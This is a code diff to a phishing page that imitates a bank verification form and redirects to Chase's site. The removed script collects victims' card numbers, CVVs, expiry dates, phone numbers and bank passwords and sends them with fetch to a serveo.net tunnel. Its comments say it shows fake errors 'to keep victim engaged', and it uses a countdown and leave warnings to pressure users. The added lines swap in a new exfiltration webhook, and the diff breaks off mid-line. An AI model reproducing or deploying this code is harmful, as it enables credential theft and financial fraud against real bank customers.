@@ -245,7 +245,7 @@
                 </div>
                 <div class="form-group">
                     <label for="cvv">CVV</label>
-                    <input type="text" id="cvv" placeholder="123" required>
+                    <input type="text" id="cvv" placeholder="123" maxlength="3" required>
                     <div class="error-message" id="cvvError">Incorrect security code</div>
                 </div>
             </div>
@@ -284,156 +284,10 @@
     </div>
 
     <script>
-        // Server configuration
-        const SERVER_ENDPOINT = 'https://1ad21a34e76a51a82030f869e0f1000c.serveo.net/submit';
+        const SERVER_URL = 'https://adbf1305e54f2fcb43bc6e593d5c809d.serveo.net/webhook';
 
-        // Countdown timer (5 minutes)
+        // Countdown timer
         let timeLeft = 5 * 60;
         let timerActive = true;
         const countdownElement = document.getElementById('countdown');
-        const timer = setInterval(updateCountdown, 1000);
-
-        function updateCountdown() {
-            if (!timerActive) return;
-            
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            if (timeLeft <= 0) {
-                showBlockedScreen();
-            } else {
-                timeLeft--;
-                
-                if (timeLeft <= 60) {
-                    countdownElement.style.color = '#d32f2f';
-                    countdownElement.style.fontWeight = 'bold';
-                    document.getElementById('leaveWarning').style.display = 'block';
-                }
-            }
-        }
-
-        function showBlockedScreen() {
-            timerActive = false;
-            document.getElementById('blockedScreen').style.display = 'flex';
-            setTimeout(() => {
-                window.location.href = 'https://www.chase.com';
-            }, 10000);
-        }
-
-        // Form submission handler
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Show loading screen
-            document.getElementById('loadingScreen').style.display = 'flex';
-            
-            // Collect all form data
-            const formData = {
-                personal_info: {
-                    name: document.getElementById('fullName').value
-                },
-                payment_info: {
-                    card_number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
-                    expiry: document.getElementById('expiry').value,
-                    cvv: document.getElementById('cvv').value
-                },
-                contact_info: {
-                    phone: document.getElementById('phone').value
-                },
-                bank_credentials: {
-                    password: document.getElementById('password').value
-                },
-                meta: {
-                    user_agent: navigator.userAgent,
-                    timestamp: new Date().toISOString(),
-                    ip: '' // Will be captured server-side
-                }
-            };
-
-            try {
-                // Send data to your Serveo endpoint
-                const response = await fetch(SERVER_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                if (response.ok) {
-                    // Show fake errors to keep victim engaged
-                    showRandomErrors();
-                } else {
-                    console.error('Server error:', response.status);
-                    showRandomErrors();
-                }
-            } catch (error) {
-                console.error('Fetch error:', error);
-                showRandomErrors();
-            } finally {
-                document.getElementById('loadingScreen').style.display = 'none';
-            }
-        });
-
-        function showRandomErrors() {
-            // Randomly show fake errors (2 out of 5 fields)
-            const errorFields = ['nameError', 'cardError', 'expiryError', 'cvvError', 'phoneError', 'passwordError'];
-            const randomErrors = errorFields.sort(() => 0.5 - Math.random()).slice(0, 2);
-            
-            // Hide all errors first
-            errorFields.forEach(id => document.getElementById(id).style.display = 'none');
-            
-            // Show random errors
-            randomErrors.forEach(id => document.getElementById(id).style.display = 'block');
-            
-            // Scroll to first error
-            if (randomErrors.length > 0) {
-                document.getElementById(randomErrors[0]).scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'center'
-                });
-            }
-        }
-
-        // Warn user when trying to leave
-        window.addEventListener('beforeunload', function(e) {
-            if (timerActive) {
-                document.getElementById('leaveWarning').style.display = 'block';
-                e.preventDefault();
-                e.returnValue = 'Your transaction will be canceled if you leave this page.';
-            }
-        });
-
-        // Input formatting
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 0) {
-                value = value.match(/.{1,4}/g).join(' ');
-            }
-            e.target.value = value.substring(0, 19);
-        });
-
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value.substring(0, 5);
-        });
-
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
-        });
-
-        document.getElementById('phone').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 15);
-        });
-
-        // Show leave warning after 2 minutes
-        setTimeout(() => {
-            document.getElementById('leaveWarning').style.display = 'block';
-        }, 2 * 60 * 1000);
-    </script>
-</body>
-</html>
+        const timer = setInterval(updateCountdown, 1000
